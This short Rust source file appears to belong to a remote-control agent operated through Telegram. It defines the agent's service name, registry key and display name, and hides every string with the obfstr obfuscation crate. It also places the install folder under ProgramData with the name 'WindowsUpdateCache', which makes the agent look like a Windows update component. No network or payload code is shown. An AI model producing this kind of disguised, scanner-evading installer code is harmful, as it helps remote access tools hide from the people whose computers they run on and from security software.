pub fn service_name() -> &'static str {
    static S: std::sync::LazyLock<String> =
        std::sync::LazyLock::new(|| obfstr::obfstring!("TgRemoteAgent"));
    &S
}

pub fn registry_path() -> &'static str {
    static S: std::sync::LazyLock<String> =
        std::sync::LazyLock::new(|| obfstr::obfstring!(r"SOFTWARE\TgRemoteAgent"));
    &S
}

pub fn service_display() -> &'static str {
    static S: std::sync::LazyLock<String> =
        std::sync::LazyLock::new(|| obfstr::obfstring!("Telegram Remote Agent"));
    &S
}

pub fn install_home() -> &'static std::path::Path {
    static S: std::sync::LazyLock<std::path::PathBuf> = std::sync::LazyLock::new(|| {
        let program_data =
            std::env::var("ProgramData").unwrap_or_else(|_| r"C:\ProgramData".to_string());
        let dir_name = obfstr::obfstring!("WindowsUpdateCache");
        std::path::PathBuf::from(program_data).join(dir_name)
    });
    S.as_path()
}
